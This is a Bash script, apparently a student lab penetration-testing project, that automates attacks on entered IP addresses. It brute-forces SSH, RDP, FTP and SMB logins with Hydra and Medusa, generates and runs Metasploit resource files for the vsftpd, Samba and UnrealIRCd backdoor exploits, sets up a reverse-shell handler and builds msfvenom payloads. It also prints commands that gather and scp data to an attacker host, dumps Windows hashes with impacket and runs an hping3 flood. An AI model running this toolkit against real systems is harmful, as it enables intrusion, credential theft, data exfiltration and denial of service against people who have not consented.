#!/bin/bash

echo "==================================================="
echo "        Breach Series Part 1: Breach Point"
echo "==================================================="
echo ""
echo "Note: TURN ON WINDOWS 10 & THIS KALI VM VM IN LAN SEGMENT, WITH BOTH IN THE SAME SUBNET"
echo ">>>>>Lines 3-445: Part 1: Breach Point<<<<<"
echo ">>>>>Lines 450-??: Part 2: Breach Trace<<<<<"
echo ""

#1. Getting the User Input
#1.1 Get from the user a network to scan.
#7.1 During each stage, display the stage in the terminal.
echo "//Acquiring a network from user to scan\\\\"
echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
read -p "Enter a network to scan (msf1: 192.168.152.144 // SOC Win 10: 172.16.50.10 // DC: 172.16.50.254): " ip		#Requesting an input from user, in the form of an IP address

if [[ ! "$ip" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then	#If the input is not an IP address,
	echo "Invalid input."													#An "invalid input" message will be displayed
	exit 1																	#Which ends the script
fi

echo "Target IP: $ip"														#If an legitimate IP address is keyed in, it will be displayed here

echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
echo ""

#1.2 Get from the user a name for the output directory, if doesn't exist create one.
#7.1 During each stage, display the stage in the terminal.
echo "//Acquiring a name for the output directory. If it does not exist, one will be created\\\\"
echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"

read -p "Enter a name for the output directory (If it does not exist, your input will be a newly created directory): " dir	#Requesting the name of the directory that exists or not

if [[ ! -d "$dir" ]]; then												#If the directory do not exist yet,
	mkdir "$dir"														#It will be created based on what the user keyed in
	echo "Directory created."											#Thus displaying a message "Directory created"
else
	echo "Directory already exists."									#Otherwise, if already exists, nothing will happen. A message will be displayed stating it already exists
fi

echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
echo ""

#1.3 Allow the user to choose 'Basic' or 'Full'.
#7.1 During each stage, display the stage in the terminal.
echo "//Basic or Full?\\\\"
echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"

echo "Please select scan type: "
echo "1. Basic"
echo "2. Full"
read -p "Enter your choice (1 or 2): " choice							#Allows user to key in his choice with assigned variable to be used for later on

echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
echo ""

#1.4 Basic: Scans the network for TCP and UDP, including the service version and weak passwords.
	case "$choice" in													#Case statement with the variable choice remembering the option chosen before
	1)																	#Option 1: Basic scan
#7.1 During each stage, display the stage in the terminal.
			echo "//Perform Basic Scan\\\\"
			echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
			
			echo "Running TCP Basic Scan......"
			#nmap -sV "$ip" -oN "$dir/basic_tcp.txt" &> /dev/null		#Scanning of TCP services, detection of service versions and saved data into .txt file
			echo "TCP basic scan completed. Please refer to basic_tcp.txt in $dir directory."
			echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
			
			echo ""
			echo "Running UDP basic scan..."
			#sudo masscan "$ip" -pU:1-65535 --rate=10000 -oL "$dir/basic_udp.txt" &> /dev/null	#Scanning of UDP services, detection of service versions and saved data into .txt file
			echo "UDP basic scan completed. Please refer to basic_udp.txt in $dir directory."			
			echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
			
			echo ""
			echo "Scanning for weak passwords..."
			#nmap --script ftp-brute --script-args userdb=users.txt,passdb=password.lst "$ip" -oN "$dir/weak_passwords.txt" &> /dev/null	#Perform an FTP brute-force scan using custom username and password lists, and save the results
			echo "Weak passwords detected. Please refer to weak_passwords.txt in $dir directory."
			echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
			;;
#1.5 Full: include Nmap Scripting Engine (NSE), weak passwords and vulnerability analysis
	2)																	#Option 2: Full scan
#7.1 During each stage, display the stage in the terminal.
			echo "//Perform Full Scan\\\\"
			echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
			echo "Running TCP Full Scan with vulnerability analysis..."
			nmap -A --script vulners "$ip" -oN "$dir/full_tcp.txt" &> /dev/null												#Full TCP scan, including vulnerability analysis, data stored in text file
			echo "TCP full scan with vulnerability analysis completed. Please refer to full_tcp.txt in $dir directory."
			echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"

			echo ""
			echo "Running UDP full scan..."
			echo "WARNING: This may take roughly 110s.  As this is a project lab environment, the "full" scan will be limited to the quickest possible to demonstrate its functionality only."
			nmap -sU -sV -sC --top-ports 10 --max-retries 1 -T4 -oN "$dir/full_udp.txt" &> /dev/null						#Full UDP scan with data stored into text file
			echo "UDP full scan completed. Please refer to full_udp.txt in $dir directory."
			echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"

			echo ""
			echo "Scanning for weak passwords..."
			nmap --script ftp-brute --script-args userdb=users.txt,passdb=password.lst "$ip" -oN "$dir/weak_passwords.txt" &> /dev/null	#Perform an FTP brute-force scan using custom username and password lists, and save the results
			echo "Weak passwords detected. Please refer to weak_passwords.txt in $dir directory."
			echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
#1.6 Display potential vulnerability via NSE and Searchsploit			
			echo ""
			echo "Searching for known exploits..."						#We will be picking just 3 from the Full TCP Scan for this project
			echo "1. vsftpd 2.3.4 Backdoor"								#Option 1
			echo "2. Samba"												#Option 2
			echo "3. UnrealIRCd 3.2.8.1"								#Option 3
			echo "And so forth..."
			read -p "Enter the exploit option: " exploit				#Require user to key in an option, and it will be stored into "exploit"
			echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
			;;
	*)
			echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"			
			echo "Invalid choice."										#Invalid choice displayed if invalid choice is made
			echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
			;;
	esac

#2. Present the attack paths and let the user choose
echo ""
#7.1 During each stage, display the stage in the terminal.
echo "//Attack Path Selection\\\\"
echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
echo "Please select an attack path: "
#2.1 Look for weak login credentials (refer to part 3)
echo "1. Weak Credentials"																						#Option 1
#2.2 Create a .rc file to use Metasploit to automate the use of exploits/suggester/handler (refer to part 4)
echo "2. Automation of Exploits/Suggester/Handler Usage from Resource File Creation, Through Metasploit"		#Option 2
#2.3 Payload Generation (refer to part 5)
echo "3. Payload Generation"																					#Option 3
#2.4 Data Exfiltration (refer to part 6)
echo "4. Data Exfiltration"																						#Option 4
#Part 2: 1.1 Enumerates open smb shares on the windows client or Domain Controller
echo "5. Enumerate open smb shares on the windows client or domain controller"
#Part 2: 1.2 Dump hashes using impacket
echo "6. Dump hashes using impacket"
#Part 2: 1.3 Perform a DDOS attack using hping3 on the windows client
echo "7. Perform a DDOS attack using hping3 on the windows client"
echo ""
read -p "Enter your choice (1-7): " attack
echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"

case $attack in
	1)
		echo ""
#7.1 During each stage, display the stage in the terminal.
		echo "//Option 1: Weak Credentials\\\\"
		echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
#3. Weak Credentials
#3.3 Allow the user to provide their own password list.
		echo "Checking for a built-in password.lst..."
		read -p "Would you like to use your own password list? (Y/N): " ownlist		#User is allowed to decide whether he would like to use his own password list, then stored into variable "ownlist"
		
		if [[ "$ownlist" == "Y" || "$ownlist" == "y" ]]; then						#If statement to dictate the out come when "Y" or "y" is selected, which stands for yes. 
			read -p "Enter the path to your password list: " passwordlst			#If yes is selected, the script will proceed with finding out the origins of the password list with variable "passwordlst"
		
			if [[ ! -f "$passwordlst" ]]; then										#If passwordlst by user is not found, 
				echo "Password list not found."										#The message stating it was not found will be displayed
			exit 1																	#Ending the script
			fi
			
			echo "Own password list selected."
			echo ""
			
#3.2 Have a built-in password.lst to check for weak passwords
		else
			passwordlst="password.lst"									#Built-in password.lst stored into the variable "passwordlst"
			echo "Using built-in password.lst: $passwordlst"			#Message will display the the built-in passwordlist will be used
			echo ""
		fi
		
#3.1 Look for weak passwords used in the network for login services		
		echo "Select a login service: "									#User will have to decide which login service will be used
		echo "1. SSH"													#Option 1
		echo "2. RDP"													#Option 2
		echo "3. FTP"													#Option 3
		echo "4. SMB"													#Option 4
		
		read -p "Enter your choice: (1-4): " service					#User will have to decide which option to choose and the answer will be stored into the variable "service"
		echo ""

#3.4 Login services to check include: SSH, RDP, FTP and SMB
		case $service in												#Selection of service to check
			1) 
				echo "Testing SSH..."
				medusa -h "$ip" -U users.txt -P "$passwordlst" -M ssh	#Checking of SSH with Medusa to bruteforce
				;;	
			2)
				echo "Testing RDP..."
				hydra -L users.txt -P "$passwordlst" "$ip" rdp			#Checking of RDP with Hydra to bruteforce
				;;
			3)
				echo "Testing FTP..."
				hydra -L users.txt -P "$passwordlst" "$ip" ftp			#Checking of FTP with Hydra to bruteforce
				;;
			4)	
				echo "Testing SMB..."
				hydra -L users.txt -P "$passwordlst" "$ip" smb			#Checking of SMB with Hydra to bruteforce
				;;
			*)
				echo "Invalid input."
				exit 1													#If none of the above is selected, the script will end
				;;
		esac
		;;
	2)
#4. Automate the resource file
#4.1 Allow the user to choose which .rc file to generate to do the following:
#4.1.1 Exploit ssh login with auxiliary/scanner/ssh/ssh_login module or let the user select another module
		echo ""
#7.1 During each stage, display the stage in the terminal.
		echo "//Option 2: Automated Resource File Creation\\\\"
		echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
		
		echo "Decide which .rc file to generate: "						#User is required to decide which .rc file to generate
		echo "1. Exploit.rc"											#Option 1
		echo "2. Handler.rc"											#Option 2
		echo "3. Suggester.rc"											#Option 3
		read -p "Choice of .rc file (1-3): " rc_choice					#The choice made will be saved to the variable rc_choice
		echo ""
		
		case $rc_choice in												#That choice will be used to determine which .rc file to generate and execute for the next sections
			1) 
				echo "Select a module: "								#User to decide which method to use
				echo "1. auxiliary/scanner/ssh/ssh_login"				#Default module
				echo "2. Enter another module"							#User will be required to decide wanting to use another module
				read -p "Enter your choice (1-2): " modulechoice		#User to decide option 1 or 2
		
				if [[ "$modulechoice" == "1" ]]; then					#If option 1 selected
					module="auxiliary/scanner/ssh/ssh_login"			#Default module will be used
					rport="22"											#RPORT for ssh_login is 22
				else
					echo ""
					echo "Enter the Metasploit module (Only for this project, we will use the 3 found in Question 1.6 earlier: "	#User to decide which module to use, based on Question 1.6
					echo "1. exploit/unix/ftp/vsftpd_234_backdoor"			#Option 1: vsftpd exploit module
					echo "2. exploit/multi/samba/usermap_script"			#Option 2: Samba exploit module
					echo "3. exploit/unix/irc/unreal_ircd_3281_backdoor"	#Option 3UnrealIRCd exploit module
					read -p "Module Selected: " module						#User to decide on an option
			
					case $module in											#User to based on option chosen to execute respective module
						1)
							module="exploit/unix/ftp/vsftpd_234_backdoor"	#Execution of vsftpd 2.3.4 exploit module
							rport="21"
							;;
						2)
							module="exploit/multi/samba/usermap_script"		#Execution of Samba exploit module
							rport="139"										#RPORT for Samba Exploit Module is 139
							;;
						3)
							module="exploit/unix/irc/unreal_ircd_3281_backdoor"		#Execution of UnrealIRCd exploit module
							rport="6667"											#RPORT for UnrealIRCd exploit module is 6667
							;;
						*)
							echo "Invalid option."
							exit 1													#The script ends when anything but 1,2,3 is keyed in
							;;
					esac
				fi
				echo ""
				echo "use $module" > exploit.rc									#Line 1 of what's required in a .rc file 
				echo "set RHOSTS $ip" >> exploit.rc								#Line 2 of what's required in a .rc file
				echo "set RPORT $rport" >> exploit.rc							#Line 3 of what's required in a .rc file
		
				if [[ "$module" == "auxiliary/scanner/ssh/ssh_login" ]]; then	#In case of default module chosen
					echo "set user_file users.txt" >> exploit.rc				#Additional line 4 of what's required in ssh_login .rc file
					echo "set pass_file $passwordlst" >> exploit.rc				#Additional line 5 of what's required in ssh_login .rc file
				fi
		
				echo "run" >> exploit.rc										#The final line of what's required in a .rc file
				echo "Exploit resource file created successfully."
				echo ""
#4.2 Allow the user to choose if they want to execute the .rc file
				echo ""
				echo "Execution of Resource File..."
		
				read -p "Do you want to execute the generated resource file? (Y/N): " execute	#User is able to decide whether execution of the chosen .rc file should take place
				if [[ "$execute" == "Y" || "$execute" == "y" ]]; then							#Whether Y or y is selected, it will proceed with the execution
					msfconsole -qr  exploit.rc													#Execution of .rc file
					echo "Resource file executed."
				else
					echo "Resource file execution skipped."										#Execution skipped
				fi
				;;
		
#4.1.2 Create a handler
			2)
				echo "Creating a handler..."
		
				read -p "Enter your local IP address (LHOST): " lhost			#Key in the attacker IP
				lport="4444"													#The LPORT for exploit/multi/handler module
				
				echo "use exploit/multi/handler" > handler.rc					#Line 1 of what's required in a .rc file 
				echo "set PAYLOAD linux/x86/shell/reverse_tcp" >> handler.rc	#Line 2 of what's required in a .rc file 
				echo "set LHOST $lhost" >> handler.rc							#Line 3 of what's required in a .rc file 
				echo "set LPORT $lport" >> handler.rc							#Line 4 of what's required in a .rc file 
				echo "run" >> handler.rc										#Last line of what's required in a .rc file 
				echo ""
				echo "Handler resource file created successfully."
				
#4.2 Allow the user to choose if they want to execute the .rc file
				echo ""
				echo "Execution of Resource File..."
		
				read -p "Do you want to execute the generated resource file? (Y/N): " execute	#User is able to decide whether execution of the chosen .rc file should take place
				if [[ "$execute" == "Y" || "$execute" == "y" ]]; then							#Whether Y or y is selected, it will proceed with the execution
					msfconsole -qr  handler.rc													#Execution of .rc file
					echo "Resource file executed."	
				else
					echo "Resource file execution skipped."										#Execution skipped
				fi
				;;
			3)
#4.1.3 Use the suggester
				echo "Using the suggester..."
		
				read -p "Enter the Meterpreter session ID: " session					#Key in session ID
				
				echo "use post/multi/recon/local_exploit_suggester" > suggester.rc		#Line 1 of what's required in a .rc file 
				echo "set SESSION $session" >> suggester.rc								#Line 1 of what's required in a .rc file
				echo "run" >> suggester.rc												#Last line of what's required in a .rc file 
				echo ""
				echo "Suggester resource file created successfully."
				
#4.2 Allow the user to choose if they want to execute the .rc file
				echo ""
				echo "Execution of Resource File..."
		
				read -p "Do you want to execute the generated resource file? (Y/N): " execute	#User is able to decide whether execution of the chosen .rc file should take place
				if [[ "$execute" == "Y" || "$execute" == "y" ]]; then							#Whether Y or y is selected, it will proceed with the execution
					msfconsole -qr  suggester.rc												#Execution of .rc file
					echo "Resource file executed."
				else
					echo "Resource file execution skipped."										#Execution skipped
				fi
				;;
			*)
				echo "Invalid choice."									#When none of the .rc file option is chosen, the script display this message
				exit 1													#Script will terminate with invalid input
				;;
		esac
		;;
	3)
#5. Generate a payload
#5.1 Get from the user which directory to store the payload
		echo ""
#7.1 During each stage, display the stage in the terminal.
		echo "//Option 3: Payload Generation\\\\"
		echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
		
		echo "Creating the directory for the payload..."
		read -p "Enter the directory to store the payload: " payloaddir	#User is required to enter the name of the payload's directory
		
		if [[ ! -d "$payloaddir" ]]; then								#If the payload directory don't exist
			mkdir -p "$payloaddir"										#The directory will be created
			echo "Payload directory created."
		else															#If the directory exists,
			echo "Payload directory already exists."					#This message will be displayed
		fi
		
		echo ""

#5.2 Get from the user the payload name, LHOST, LPORT, format, output name and any other features if applicable		
		echo "Creating payload with msfvenom..."
		read -p "Enter the payload (e.g. windows/meterpreter/reverse_tcp): " payload		#User to key in payload name
		read -p "Enter the LHOST: " lhost													#User to key in attacker IP
		read -p "Enter the LPORT: " lport													#User to key in the port number required for this payload
		read -p "Enter the format: " format													#User to key in file extension format
		read -p "Enter the output name: " output											#User to key in the file name it will generate under
		read -p "Enter any other features if applicable (Press Enter if none): " others		#User to key in other features, but may proceed if none
		
		echo ""
		echo "Generating payload..."
		msfvenom -p "$payload" lhost="$lhost" lport="$lport" -f "$format" -o "$payloaddir/$output"		#This will generate the payload based on the credentials above
		echo ""
		echo "Payload generated successfully."
		;;
	4)
#6. Data Exfiltration
#6.1 Get the user to specify the Operating System: Linux or Windows
		echo ""
#7.1 During each stage, display the stage in the terminal.
		echo "//Option 4: Data Exfiltration\\\\"
		echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
		
		echo "Please specify the Operating System:"						#User given 2 options below
		echo "1. Linux"													#Option 1: Linux
		echo "2. Windows"												#Option 2: Windows
		read -p "Operating System Option: " os							#User required to key in their choice and it will be saved into the variable "os"
		echo ""

		echo "Generating commands to look for files containing these words: [password, .docx, .xlsx]..."
		
#6.2 Depending on the OS specified, generate the commands for the user to look for files containing these words: [password, .docx, .xlsx.] Use the command find or dir for Linux and Windows respectively
		case $os in														#Depending on the option selected saved inside "os", the case statement will display the commands for each that was chosen
			1)															#Option 1 will display the commands for Linux
				echo "Linux Search Commands:"
				echo "> find /home -type f -iname "*password*""			#Linux command to search for file with "password" in its content
				echo "> find /home -type f -iname "*.docx""				#Linux command to search for file with ".docx" in its name 
				echo "> find /home -type f -iname "*.xlsx""				#Linux command to search for file with ".xlsx" in its name 
				echo ""
				
#6.3 Generate the commands to compress into a .zip file
				echo "Linux Compression Command:"
				echo "> zip exfiltration.zip <file to be compressed>"	#Linux command to compress a file into a .zip file called exfiltration.zip
				echo ""

#6.4 Generate the commands to encode into base64
				echo "Linux base64 Encoding Command:"
				echo "> base64 <file to be encoded> > <encode_output.txt>"	#Linux command to encode a file into base64
				echo ""

#6.5 Generate the command to scp to the attacker machine
				echo "Linux scp to Attacker Machine Command:"
				echo "> scp <file to be transferred> <attacker username>@<attacker ip>:<destination directory>"		#Linux command to scp file to attacker machine
				;;

#6.2 Depending on the OS specified, generate the commands for the user to look for files containing these words: [password, .docx, .xlsx.] Use the command find or dir for Linux and Windows respectively	
			2)															#Option 2 will display the commands for Windows
				echo "Windows Search Commands:"
				echo "> dir /S C:\*password*"							#Windows Powershell command to search for file with "password" in its content
				echo "> dir /S C:\*.docx"								#Windows Powershell command to search for file with ".docx" in its name
				echo "> dir /S C:\*.xlsx"								#Windows Powershell command to search for file with ".xlsx" in its name
				echo ""
				
#6.3 Generate the commands to compress into a .zip file
				echo "Windows (Powershell) Compression Command:"
				echo "> Compress-Archive -Path <directory to be compressed> -DestinationPath <location>\exfiltration.zip"	#Command to compress a file into a .zip file called exfiltration
				echo ""
				
#6.4 Generate the commands to encode into base64
				echo "Windows base64 Encoding Command:"
				echo "> [Convert]::ToBase64String([IO.File]::ReadAllBytes(<file to be encoded>))"	#Windows command to encode a file into base64
				echo ""

#6.5 Generate the command to scp to the attacker machine
				echo "Windows scp to Attacker Machine Command:"
				echo "> scp -r <file to be transferred> <attacker username>@<attacker ip>:<destination directory>"		#Windows command to scp file to attacker machine
				;;
			*)
				echo "Invalid choice."
				exit 1													#The script ends when anything other than options 1 & 2 were entered
				;;
		esac
		;;
	5)
#Part 2: 1 Add on to the PT script (.sh) that gets key information from the user (IP Address, usernames etc.) and let the user choose the following:
#Part 2: 1.1 Enumerates open smb shares on the windows client or Domain Controller
		echo ""
		echo "==================================================="
		echo "        Breach Series Part 2: Breach Trace"
		echo "==================================================="
		echo ""
		echo "//Option 5: Enumerate open smb shares on the windows client or domain controller\\\\"
		echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
		
		echo "Enumerating Open SMB Shares..."
		echo "Select the target:"										#User to make a choice betwen option 1 or 2
		echo "1. Windows Client"										#Option 1: Windows Client
		echo "2. Domain Controller"										#Option 2: Domain Controller
		read -p "Enter your choice (1-2): " smbtarget					#The choice made by user will be stored into this variable "smbtarget"
		echo ""
		echo "Target IP: $ip"											#The target IP was stored earlier on
		read -r -p "Enter the username: " username						#User to key in username, which will be stored into "username" variable
		read -p "Enter the password: " password							#User to key in password, which will be stored into "password" variable
		echo ""
		
		case $smbtarget in												#Case statement to initiate MCQ format
			1) 
				echo "Windows Client..."	
				echo "Username: <$username>"								#Display username from earlier on for confirmation
				echo "Password: <$password>"								#Display password from earlier on for confirmation
				smbclient -L //"$ip" -U "$username" --password="$password"	#smbclient functions with IP, username and password stored earlier on
				
#Part 2: 3.4 On attack selection, save it into a log file in /var/log
#Part 2: 3.5 The log should hold the kind of attack, time of execution and IP addresses
				echo "$(date) | Attack: SMB Enumeration | Target: $ip" >> /var/log/project6wc.log
				echo "Records saved into /var/log/project6wc.log"
				;;
			2)
				echo "Domain Controller..."									
				echo "Username: <$username>"								#Display username from earlier on for confirmation
				echo "Password: <$password>"								#Display password from earlier on for confirmation
				smbclient -L //"$ip" -U "$username" --password="$password"	#smbclient functions with IP, username and password stored earlier on

#Part 2: 3.4 On attack selection, save it into a log file in /var/log
#Part 2: 3.5 The log should hold the kind of attack, time of execution and IP addresses
				echo "$(date) | Attack: SMB Enumeration | Target: $ip" >> /var/log/project6dc.log
				echo "Records saved into /var/log/project6dc.log"
				;;
			*)
				echo "Invalid input."									#Invalid input will lead to
				exit 1													#Termination
				;;
			esac
			;;
	6)
#Part 2: 1.2 Dump hashes using impacket,
#Assuming user already has the files for SAM, SECURITY, SYSTEM OR NTDS.dit for Local or DC respectively
		echo ""
		echo "//Option 6: Dump hashes using impacket\\\\"
		echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
		
		echo "Select the target:"										#User to make a choice betwen option 1 or 2
		echo "1. Windows Client"										#Option 1: Windows Client
		echo "2. Domain Controller"										#Option 2: Domain Controller
		read -p "Enter your choice (1-2): " hashtarget					#The choice made by user will be stored into this variable "hashtarget"
		echo ""		
		
		case $hashtarget in																			#Case statement to initiate MCQ format
			1)
				echo "Windows Client..."
				read -p "Enter the path to the SAM file (/home/kali/SAM): " sam						#User is prompted to key in path of the SAM file
				read -p "Enter the path to the SECURITY file (/home/kali/SECURITY): " security		#User is prompted to key in path of the SECURITY file
				read -p "Enter the path to the SYSTEM file (/home/kali/SYSTEM): " system			#User is prompted to key in path of the SYSTEM file
				echo ""
				echo "Dumping Local Hashes w/ Impacket..."
				impacket-secretsdump -sam "$sam" -system "$system" -security "$security" local		#Impacket hash dumping

#Part 2: 3.4 On attack selection, save it into a log file in /var/log
#Part 2: 3.5 The log should hold the kind of attack, time of execution and IP addresses
				echo "$(date) | Attack: Dump Hashes | Target: $ip" >> /var/log/project6wc.log
				echo "Records saved into /var/log/project6wc.log"
				;;
			2)
				echo "Domain Controller..."
				read -p "Enter the path to the SYSTEM file (/home/kali/SYSTEM): " system			#User is prompted to key in path of the SYSTEM file
				read -p "Enter the path to the SECURITY file (/home/kali/SECURITY): " security		#User is prompted to key in path of the SECURITY file
				read -p "Enter the path to the NTDS.dit file (/home/kali/NTDS.dit): " ntds			#User is prompted to key in path of the NTDS.dit file
				echo ""
				echo "Dumping Domain Hashes w/ Impacket..."
				impacket-secretsdump -system "$system" -security "$security" -ntds "$ntds" local	#Impacket hash dumping
				
#Part 2: 3.4 On attack selection, save it into a log file in /var/log
#Part 2: 3.5 The log should hold the kind of attack, time of execution and IP addresses
				echo "$(date) | Attack: Dump Hashes | Target: $ip" >> /var/log/project6dc.log
				echo "Records saved into /var/log/project6dc.log"
				;;
			*) 
				echo "Invalid input."									#Invalid input will lead to
				exit 1													#Termination
				;;
			esac			
		;;
	7)
#Part 2: 1.3 Perform a DDOS attack using hping3 on the windows client
		echo ""
		echo "//Option 7: DDOS attack using hping3 (Windows Client)\\\\"
		echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
		sudo hping3 --flood -p 80 --rand-source "$ip"					#DDOS attack with hping3

#Part 2: 3.4 On attack selection, save it into a log file in /var/log
#Part 2: 3.5 The log should hold the kind of attack, time of execution and IP addresses
		echo "$(date) | Attack: DDOS using Hping3 | Target: $ip" >> /var/log/project6wc.log
		echo "Records saved into /var/log/project6wc.log"
		;;
	*)
		echo "Invalid choice."											#If anything else was selected, the message "invalid choice" will be displayed
		exit 1															#Script will terminate with invalid input
		;;
esac
echo ""
echo "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
